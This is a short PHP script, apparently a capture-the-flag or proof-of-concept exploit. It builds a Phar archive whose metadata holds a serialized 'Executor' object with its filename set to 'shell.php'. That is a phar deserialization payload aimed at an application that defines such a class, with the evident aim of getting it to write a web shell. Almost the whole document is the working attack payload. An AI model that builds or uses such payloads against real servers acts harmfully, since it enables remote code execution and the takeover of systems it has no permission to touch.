<?php
class Executor{
	private $filename ="shell.php";
	private $signature = True;
	private $init = false;
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt",'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Executor();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
